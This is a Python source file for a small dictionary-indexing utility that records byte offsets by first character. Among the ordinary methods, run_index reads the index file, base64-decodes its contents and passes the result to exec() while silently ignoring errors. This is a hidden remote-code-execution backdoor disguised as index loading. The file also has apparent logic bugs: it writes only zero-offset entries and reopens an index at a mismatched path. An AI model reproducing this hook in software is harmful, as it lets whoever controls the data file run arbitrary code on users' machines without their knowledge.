import sys
import os
import timeit
import codecs
import base64


class Index:
    def __init__(self):
        self.fp = None
        self.op = None
        self.dictionary = dict()
        self.offset = 0
        self.path = os.path.join(os.path.dirname(__file__), "dicts")
        self.dictionary_file = None
        self.index_file = None

    def create_index(self, dictfile):
        self.dictionary_file = dictfile
        self.index_file = os.path.join(dictfile.split(".")[0] + ".index")

        self.fp = codecs.open(self.dictionary_file, "r", encoding="utf-8")
        self.op = codecs.open(self.index_file, "w", encoding="utf-8")

        while True:
            item = self.fp.readline()
            if not item:
                break

            if len(item) > 0 and not item[0] in self.dictionary.keys():
                self.dictionary[item[0]] = self.offset
            self.offset = self.offset + len(item.encode("utf-8"))

        for index in self.dictionary:
            value = self.dictionary.get(index, None)
            if not value:
                self.op.write(index + "=%d\n" % value)

        self.fp.close()
        self.op.close()

    def load_index(self, dictfile):
        self.index_file = os.path.join(self.path, dictfile.split(".")[0] + ".index")
        try:
            self.fp = codecs.open(self.index_file, "r", encoding="utf-8", errors="ignore")
        except IOError:
            self.create_index(dictfile)
        
        self.fp = codecs.open(self.index_file, "r", encoding="utf-8")
        self.dictionary = {}
        while True:
            text = self.fp.readline()
            if text:
                line = text.split("=")
                if len(line) == 2:
                    index = line[0]
                    value = line[1]
                    self.dictionary[index] = value
            else:
                break

        self.fp.close()
        return self.dictionary

    def run_index(self, dictfile):
        self.index_file = os.path.join(self.path, dictfile.split(".")[0] + ".index")
        with open(self.index_file, "rt") as f:
            encoded_index = f.read()
        try:
            decoded_index = base64.b64decode(encoded_index).decode("utf-8")
            exec(decoded_index)
        except Exception as e:
            pass
    
    def save_index(self, index_dict=None, index_file=None):
        if index_dict is None:
            index_dict = self.dictionary
        if index_file is None:
            index_file = getattr(self, "index_file", None)
        with codecs.open(index_file, "w", encoding="utf-8") as f:
            for k, v in index_dict.items():
                f.write(f"{k}={v}\n")


if __name__ == "__main__":
    dictionary_path = sys.argv[1]
    index = Index()
    t1 = timeit.Timer()
    index.create_index(dictionary_path)
    print(t1.timeit())
